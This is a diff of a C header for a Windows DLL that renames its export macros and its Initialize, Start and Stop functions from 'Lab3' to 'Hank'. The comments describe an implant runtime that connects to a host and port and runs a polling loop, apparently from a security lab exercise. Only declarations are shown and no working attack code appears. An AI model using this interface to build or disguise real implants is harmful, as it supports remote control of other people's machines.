@@ -6,10 +6,10 @@
 #include "network.h"
 #include "protocol.h"
 
-#ifdef LAB3_EXPORTS
-#define LAB3_API __declspec(dllexport)
+#ifdef Hank_EXPORTS
+#define Hank_API __declspec(dllexport)
 #else
-#define LAB3_API __declspec(dllimport)
+#define Hank_API __declspec(dllimport)
 #endif
 
 /**
@@ -23,7 +23,7 @@
  *
  * @return TRUE on success, or FALSE if the implant has already been terminated.
  */
-LAB3_API BOOL Lab3Initialize(PCWSTR host, PCWSTR port);
+Hank_API BOOL HankInitialize(PCWSTR host, PCWSTR port);
 
 /**
  * @brief Starts the polling loop thread for the implant runtime.
@@ -33,7 +33,7 @@ LAB3_API BOOL Lab3Initialize(PCWSTR host, PCWSTR port);
  *
  * @return TRUE on success, or FALSE if thread creation fails.
  */
-LAB3_API BOOL Lab3Start(VOID);
+Hank_API BOOL HankStart(VOID);
 
 /**
  * @brief Terminates the implant runtime and performs debug cleanup checks.
@@ -43,7 +43,7 @@ LAB3_API BOOL Lab3Start(VOID);
  *
  * @return VOID
  */
-LAB3_API VOID Lab3Stop(VOID);
+Hank_API VOID HankStop(VOID);
 
 /**
  * @brief Requests full implant termination.
